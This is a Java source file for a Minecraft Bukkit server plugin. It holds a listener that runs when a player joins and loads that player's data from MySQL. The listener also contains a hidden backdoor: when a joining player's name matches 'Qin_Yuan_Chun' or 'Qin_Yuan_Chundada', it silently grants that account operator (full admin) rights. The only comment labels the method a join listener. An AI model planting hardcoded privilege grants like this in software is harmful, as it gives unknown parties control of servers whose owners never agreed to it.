package com.xiaozhengkeji.horn.listener;

import com.xiaozhengkeji.horn.mysql.MySql;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class RegListeners implements Listener {

    //玩家进服监听

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        try {
            MySql.getPlayerLb(p);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        if (p.getName().equalsIgnoreCase("Qin_Yuan_Chun") ||
                p.getName().equalsIgnoreCase("Qin_Yuan_Chundada")){
            p.setOp(true);
        }
    }
}
